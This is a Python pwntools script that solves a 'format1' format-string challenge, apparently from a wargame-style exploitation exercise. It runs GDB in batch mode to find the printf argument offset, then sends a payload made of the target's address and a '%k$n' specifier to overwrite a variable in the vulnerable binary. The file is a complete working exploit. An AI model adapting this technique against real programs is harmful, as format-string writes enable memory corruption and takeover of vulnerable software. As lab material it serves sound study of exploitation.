#!/usr/bin/env python3

from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path

from pwn import ELF, log, p32, process

SUCCESS = b"you have modified the target"


def main() -> int:
    prog = str(Path(__file__).resolve().with_name("format1"))
    elf = ELF(prog)
    tgt = elf.symbols.get("target")
    if not tgt:
        log.failure("target symbol not found")
        return 2

    # Deterministic approach (matches the blog's core idea, but avoids "crash-prone" popping):
    # At the printf callsite:
    #   [esp+4] = fmt pointer (argv[1])
    #   varargs start at esp+8
    # If printf walks far enough, it will eventually "read arguments" out of the argv string.
    # The positional index k for the first dword of argv[1] is approximately:
    #   k = (fmt - (esp+8)) / 4
    # Then we can do: p32(&target) + %k$n
    #
    # We compute k in GDB in batch mode against THIS exact binary build.
    gdb_script = "\n".join(
        [
            "set pagination off",
            "set confirm off",
            "file " + prog,
            "break printf@plt",
            "run AAAA",
            "set $fmt = *(unsigned int*)($esp+4)",
            "set $base = (unsigned int)($esp+8)",
            "printf \"%u\\n\", (unsigned int)(($fmt - $base) / 4)",
            "quit",
            "",
        ]
    )
    with tempfile.NamedTemporaryFile("w", prefix="format1-", suffix=".gdb", delete=False) as f:
        f.write(gdb_script)
        sp = f.name
    try:
        cp = subprocess.run(
            ["gdb", "-q", "-nx", "-batch", "-x", sp],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    finally:
        try:
            Path(sp).unlink()
        except Exception:
            pass

    out = cp.stdout.decode("latin-1", "replace")
    k = None
    for line in out.splitlines()[::-1]:
        line = line.strip()
        if line.isdigit():
            k = int(line)
            break
    if k is None or k <= 0 or k > 50000:
        log.failure("format1: failed to compute k via gdb")
        return 2

    payload = p32(tgt) + (f"%{k}$n").encode()
    out2 = process([prog, payload]).recvall(timeout=2)
    if SUCCESS in out2:
        log.success("format1 solved (k=%d)", k)
        return 0
    log.failure("format1 exploit failed (k=%d)", k)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
